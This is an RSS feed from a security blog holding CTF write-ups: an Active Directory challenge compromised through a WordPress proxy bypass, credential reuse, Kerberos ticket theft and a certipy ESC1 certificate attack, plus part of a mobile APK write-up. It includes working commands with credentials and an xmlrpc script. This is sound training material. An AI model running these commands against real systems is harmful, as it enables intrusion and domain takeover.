<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on</title><link>https://blog.ikuamike.io/tags/ctf/</link><description>Recent content in CTF on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 17 Nov 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>P3RF3CT R00T CTF 2024 Writeup - Active Directory</title><link>https://blog.ikuamike.io/posts/2024/p3rf3ctr00t_ctf_2024_ad/</link><pubDate>Sun, 17 Nov 2024 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2024/p3rf3ctr00t_ctf_2024_ad/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/ctf_logo.jpg" class="center" style="border-radius: 8px;" />
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>This weekend I had some fun participating in the P3RF3CTR00T CTF 2024 by &lt;a href="https://twitter.com/p3rf3ctr00t" target="_blank" rel="noopener">p3rf3ctr00t&lt;/a>
ctf team, barely got some sleep. They really did a good job considering it&amp;rsquo;s their first edition of the CTF, I didn&amp;rsquo;t experience any downtime and support was very helpful on their discord server. They had over 50 challenges!&lt;/p>
&lt;p>Kudos to them, I am happy to see an evolution of CTFs in the Kenyan hacking scene. I have been playing CTFs for a while and this one gave me a fun challenge, at some point I was number 1. I was playing solo under &lt;strong>NoPwnNoGain&lt;/strong>.&lt;/p>
&lt;p>Alright, let&amp;rsquo;s get into the writeup. The AD category was a challenge to everyone, even after 24 hrs I was the only solver. Later, on there were additional solves but no one else got DA :).&lt;/p>
&lt;h2 id="attack">Attack&lt;/h2>
&lt;p>We start of with the challenge information. Important info here is the IP and the Artifact.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_1.png" class="center" style="border-radius: 8px;" />
&lt;p>We begin by running a full portscan on the target.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_2.png" class="center" style="border-radius: 8px;" />
&lt;p>We only get port 22 and 80 open, on port 80 we have a Wordpress site.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_3.png" class="center" style="border-radius: 8px;" />
&lt;p>I fired up wpscan, to get recon going as I clicked around the site to see what was posted.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://154.12.228.253/ -e ap,at,tt,cb,dbe,u --api-token --redacted-- -o wpscan.out
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the scan, the only notable finding was the discovered user, we could also see the username on the site from a published post.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_4.png" class="center" style="border-radius: 8px;" />
&lt;p>After recon, the only logical next step was to target this user. Remember the &lt;strong>Artifact - Winterseason1234&lt;/strong> from the challenge info? Let&amp;rsquo;s test it as the password for this account.&lt;/p>
&lt;p>Unfortunately, when we try accessing /wp-admin we are forbidden. Based on the output, there&amp;rsquo;s a proxy blocking this access.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_5.png" class="center" style="border-radius: 8px;" />
&lt;p>So how do we test the credentials? Since I remember xmlrpc was accessible based on the wpscan output, I used metasploit&amp;rsquo;s &lt;code>wordpress_xmlrpc_login&lt;/code> module to check if the password is valid.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_6.png" class="center" style="border-radius: 8px;" />
&lt;p>Now that we confirm the password is valid, what next? We can&amp;rsquo;t access wp-admin.&lt;/p>
&lt;p>I got stuck here for some time doing various things against wordpress, I tried scanning again to see if I missed anything. I tried using xmlrpc to make modifications on the site but it has very limited functionality. Without much success, I decided that finding a bypass so as to access wp-admin was the only way forward.&lt;/p>
&lt;p>I tried several bypasses such as adding X-Forwared-For headers but no dice. Finally a little trickery with the URL worked.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_7.png" class="center" style="border-radius: 8px;" />
&lt;p>By using path traversal, I was able to bypass the proxy and get to Wordpress. As you can see we no longer get 403 Forbidden.&lt;/p>
&lt;p>The next step is to make sure I can comfortably do this on the browser. Burp&amp;rsquo;s Match and Replace for the win.&lt;/p>
&lt;p>I added the following rule that ensures, whenever I use &lt;code>/wp-admin&lt;/code> on the browser, Burp would replace it with &lt;code>/wp-content/../wp-admin&lt;/code> and forward it to the server.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_8.png" class="center" style="border-radius: 8px;" />
&lt;p>To make things smoother, I did the same for wp-login.php as well.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_9.png" class="center" style="border-radius: 8px;" />
&lt;p>Now we can comfortably login to wp-admin.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_10.png" class="center" style="border-radius: 8px;" />
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_11.png" class="center" style="border-radius: 8px;" />
&lt;p>With access to the admin panel, getting a shell is straighforward. We can modify one of the theme files to include our php shell payload. I initially did this, but later realized I had skipped the intended path. So let&amp;rsquo;s follow the intended path (which is easier).&lt;/p>
&lt;h3 id="wordstress-flag">WordStress Flag&lt;/h3>
&lt;p>In the comments, there&amp;rsquo;s one comment that is in the trash. This includes the WordStress flag and the password to crocodile on the host.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_12.png" class="center" style="border-radius: 8px;" />
&lt;p>WordStress Flag: &lt;code>r00t{well_lif3_1s_T00_h4rD_w1d_p0xies_pixies}&lt;/code>&lt;/p>
&lt;p>We can now comfortably ssh into the box. The important bit, was to ensure we specify the domain. This was not a local user but a user on Active Directory.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_13.png" class="center" style="border-radius: 8px;" />
&lt;p>This was easier for me since I initially got access to the box via a reverse shell and discovered the domain name.&lt;/p>
&lt;p>I would imagine, it wouldn&amp;rsquo;t have been so intuitive to provide the domain name on the first try. Even though on the comment we are given some sort of hint, I bet it wouldn&amp;rsquo;t have been a quick thing to figure out.&lt;/p>
&lt;h3 id="calm-belt-flag">Calm Belt Flag&lt;/h3>
&lt;p>Once logged in we have access to the next flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_14.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;code>r00t{Th3_calm_b3lt_isnt_s0_calm}&lt;/code>&lt;/p>
&lt;p>After some local recon, the next step seemed to point to attacking Active Directory no need for privesc to root.&lt;/p>
&lt;p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_15.png" class="center" style="border-radius: 8px;" />
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_16.png" class="center" style="border-radius: 8px;" />
&lt;/p>
&lt;p>We now have the IP of what could be Domain Controller as that&amp;rsquo;s where our DNS is pointed to. I&amp;rsquo;ll use this linux box to proxy traffic to the DC and attack directly from my local kali machine.&lt;/p>
&lt;p>Let&amp;rsquo;s setup a socks proxy over SSH.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -D &lt;span style="color:#ae81ff">1080&lt;/span> &lt;span style="color:#e6db74">&amp;#39;crocodile@grandline.local&amp;#39;&lt;/span>@154.12.228.253
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I&amp;rsquo;ll point my proxychains config to 127.0.0.1 1080 and everything is all set. I&amp;rsquo;ll begin by using netexec as it has a lot of good features built-in.&lt;/p>
&lt;p>I am able to confirm that the IP we have is indeed for the domain controller and the credentials for the crocodile user are valid for the domain.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_17.png" class="center" style="border-radius: 8px;" />
&lt;p>Now let&amp;rsquo;s do some more recon on the domain.&lt;/p>
&lt;h4 id="domain-users">Domain Users:&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --users
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>There were many users present, but since the password for most of them were set in the same minute. I chose to consider only a few who were interesting and had different password set times meaning they could have some significance in the challenge.&lt;/p>
&lt;ol>
&lt;li>Administrator&lt;/li>
&lt;li>krbtgt&lt;/li>
&lt;li>sanji&lt;/li>
&lt;li>crocodile&lt;/li>
&lt;li>koala&lt;/li>
&lt;/ol>
&lt;p>The user sanji is also present in the linux box.&lt;/p>
&lt;h4 id="domain-computers">Domain Computers:&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --computers
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Only two are present.&lt;/p>
&lt;ol>
&lt;li>\calmbelt$ (our Linux box)&lt;/li>
&lt;li>grandline.local\DC$ (the DC)&lt;/li>
&lt;/ol>
&lt;h4 id="network-shares">Network Shares&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --shares
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>One of the network shares was interesting to me, since it&amp;rsquo;s not usually present by default. This signalled to me that we have ADCS configured and it could potentially be our attack vector.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_18.png" class="center" style="border-radius: 8px;" />
&lt;h4 id="bloudhound">BloudHound&lt;/h4>
&lt;p>Netexec also has the option to collect data for use in bloodhound.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec ldap 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --bloodhound --dns-server 94.72.112.254 -c All
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_19.png" class="center" style="border-radius: 8px;" />
&lt;p>In bloodhound, when we look at the information about the interesting users we previously got. Sanji seems to have additional privileges on the Domain. He is part of the &lt;code>Remote Management Users&lt;/code> group.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_20.png" class="center" style="border-radius: 8px;" />
&lt;p>This means, we may need to first get access as sanji. I remembered that during my local recon on the linux box there was a ccache file for sanji in /tmp.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_21.png" class="center" style="border-radius: 8px;" />
&lt;p>After downloading the file to my local machine, I imported the ccache file and could now use it for kerberos authentication auth as sanji. For netexec we need to specify &lt;code>--use-kcache&lt;/code>.&lt;/p>
&lt;p>proxychains -q netexec smb 94.72.112.254 &amp;ndash;use-kcache&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_22.png" class="center" style="border-radius: 8px;" />
&lt;p>At this point, this was well and good but I still couldn&amp;rsquo;t use this access to connect to the DC. So I switched to trying out ADCS. Since we noted it was present when we did recon on the available shares.&lt;/p>
&lt;p>I used certipy and specified -old-bloodhound, so I can import the results into the bloodhound.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy find -u crocodile@grandline.local -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> -dc-ip 94.72.112.254 -old-bloodhound
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_23.png" class="center" style="border-radius: 8px;" />
&lt;p>From Bloodhound, we can see that we have 2 certificates that we can use for ESC1 attack.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_24.png" class="center" style="border-radius: 8px;" />
&lt;p>If we checked from our owned principals, we see that we can use sanji to abuse this.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_25.png" class="center" style="border-radius: 8px;" />
&lt;p>From certipy output (if you don&amp;rsquo;t provide the -old-bloodhound option), we can confirm that sanji has rights on this certificate. This is also the challenge name, so it was a no brainer this was the intended path.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_26.png" class="center" style="border-radius: 8px;" />
&lt;h3 id="marinford-degree-flag">Marinford Degree Flag&lt;/h3>
&lt;p>Now we can exploit this and get administrator access and access the flag.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy req -k -ca grandline-DC-CA -target dc.grandline.local -template Marinford_Degree -upn administrator@grandline.local -dns-tcp -dc-ip 94.72.112.254
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_27.png" class="center" style="border-radius: 8px;" />
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_28.png" class="center" style="border-radius: 8px;" />
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_29.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;code>r00t{C3rtificate_f0r_grandline_wh4t_a_j0ke_I_can_for9e}&lt;/code>&lt;/p>
&lt;h2 id="extras">Extras&lt;/h2>
&lt;p>After finishing the CTF, I got this idea. Since I was playing around with xmlrpc, could we have just accessed the comment in trash using xmlrpc? Then we don&amp;rsquo;t need to struggle with the 403 bypass. Even though xmlrpc functionality is limited. It can pretty much read most of the things on wordpress.&lt;/p>
&lt;p>ChatGPT for the win. ChatGPT wrote for me this python script that I could use to read the hidden comment and flag. Awesome!&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> xmlrpc.client
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># WordPress site XML-RPC URL&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://154.12.228.253/xmlrpc.php&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># WordPress login credentials&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;crocodile&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Winterseason1234&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Create the XML-RPC client&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>client &lt;span style="color:#f92672">=&lt;/span> xmlrpc&lt;span style="color:#f92672">.&lt;/span>client&lt;span style="color:#f92672">.&lt;/span>ServerProxy(wp_url)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Define the parameters to get comments in the trash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>comment_filter &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;status&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;trash&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># Filter comments with status &amp;#39;trash&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Call the wp.getComments method&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> comments &lt;span style="color:#f92672">=&lt;/span> client&lt;span style="color:#f92672">.&lt;/span>wp&lt;span style="color:#f92672">.&lt;/span>getComments(&lt;span style="color:#ae81ff">0&lt;/span>, wp_username, wp_password, comment_filter)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Check if any comments are found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> comments:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Comments in Trash:&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> comment &lt;span style="color:#f92672">in&lt;/span> comments:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;ID: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;comment_id&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Post ID: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;post_id&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Author: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;author&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Content: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;content&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Date: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;date_created_gmt&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;-&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">40&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;No comments found in the trash.&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">except&lt;/span> xmlrpc&lt;span style="color:#f92672">.&lt;/span>client&lt;span style="color:#f92672">.&lt;/span>Fault &lt;span style="color:#66d9ef">as&lt;/span> e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Error occurred: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>e&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_30.png" class="center" style="border-radius: 8px;" />
&lt;p>During the CTF, it definitely wouldn&amp;rsquo;t have been the first thing to try, but still interesting to see that it works.&lt;/p>
&lt;p>I&amp;rsquo;m not sure the author knew this was possible. This is a clear indication that blocking access to the wp-admin portal doesn&amp;rsquo;t really fully protect the wordpress instance, xmlrpc has some useful functionality! This is if you have valid credentials. Most online resources around attacking wordpress using xmlrpc don&amp;rsquo;t really cover this.&lt;/p>
&lt;p>There is potential to write an script that goes through xmlrpc and dumps various info if wp-admin is blocked. I hope you the reader can look into it. I surely will.&lt;/p>
&lt;p>It tried using wp-json as well but I didn&amp;rsquo;t succeed.&lt;/p>
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>This was good challenge, cheers to the author &lt;a href="https://x.com/byronchris25" target="_blank" rel="noopener">Winter&lt;/a>
. Thanks for reading to the end!&lt;/p></content></item><item><title>NahamCon CTF 2024 WriteUp - Mobile</title><link>https://blog.ikuamike.io/posts/2024/nahamcon_ctf_2024_mobile/</link><pubDate>Tue, 28 May 2024 00:02:45 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2024/nahamcon_ctf_2024_mobile/</guid><description>Introduction Following my previous writeup that I did for Misc challenges in the NahamCon CTF, I decided to play the challenges in the Mobile category. This is post CTF as they left the challenges up for a few days after the competition was over.
I tried my best to not look at released writeups as I worked on these challenges as a way to learn something new or even just practice some of what I already know.</description><content>&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>Following my previous writeup that I did for Misc challenges in the NahamCon CTF, I decided to play the challenges in the Mobile category. This is post CTF as they left the challenges up for a few days after the competition was over.&lt;/p>
&lt;p>I tried my best to not look at released writeups as I worked on these challenges as a way to learn something new or even just practice some of what I already know.&lt;/p>
&lt;h2 id="1-kitty-kitty-bang-bang">1. Kitty Kitty Bang Bang&lt;/h2>
&lt;p>This challenge is rated &lt;strong>Easy&lt;/strong>.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/kittykittybangbang_2.png" class="center" style="border-radius: 8px;" />
&lt;p>We are provided with the &lt;a href="https://blog.ikuamike.io/files/nahamcon_ctf_2024/com.nahamcon2024.kittykittybangbang.apk">apk&lt;/a>
file for the challenge. I&amp;rsquo;ll start by loading it into &lt;a href="https://github.com/skylot/jadx/releases" target="_blank" rel="noopener">jadx-gui&lt;/a>
decompiler. Looking at the Android Manifest we see app info such as the package name, activity etc.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/kittykittybangbang_1.png" class="center" style="border-radius: 8px;" />
&lt;p>Navigating to the MainActivity and looking at the decompiled code, we note that the application logs several information including the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/kittykittybangbang_3.png" class="center" style="border-radius: 8px;" />
&lt;p>With this knowledge, we can install the app in an emulator, I&amp;rsquo;ll use genymotion and look at the logs.
When installed, the app only displays a picture of a cat.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/kittykittybangbang_4.png" class="center" style="border-radius: 8px;" />
&lt;p>To view the logs from the app, we first get the pid of the running app.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>adb shell ps | grep kitty
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we have the pid, we can supply it to logcat.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>adb logcat -v color --pid&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2333&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/kittykittybangbang_5.png" class="center" style="border-radius: 8px;" />
&lt;p>With the logs streaming in, we tap on the picture of the cat.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/kittykittybangbang_7.png" class="center" style="border-radius: 8px;" />
&lt;p>We then get the flag in the logs.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/kittykittybangbang_6.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="2-guitar">2. Guitar&lt;/h2>
&lt;p>This challenge is rated &lt;strong>Easy&lt;/strong>.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/Guitar_1.png" class="center" style="border-radius: 8px;" />
&lt;p>We are provided with the &lt;a href="https://blog.ikuamike.io/files/nahamcon_ctf_2024/com.nahamcon2024.guitar.apk">apk&lt;/a>
which I&amp;rsquo;ll load into jadx.&lt;/p>
&lt;p>Looking through the Android Manifest and decompiled code, I eventually found the flag in the strings.xml file in base64 encoded format.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/Guitar_2.png" class="center" style="border-radius: 8px;" />
&lt;p>flag:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/Guitar_3.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="3-buggy-jumper-1">3. Buggy Jumper 1&lt;/h2>
&lt;p>This challenge is rated &lt;strong>Easy&lt;/strong>.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/nahamcon_ctf_2024/buggy_jumper_1.png" class="center" style="border-radius: 8px;" />
&lt;p>We are provided with the &lt;a href="https://blog.ikuamike.io/files/nahamcon_ctf_2024/com.nahamcon2024.buggyjumper.apk">apk&lt;/a>
file for the challenge.&lt;/p>
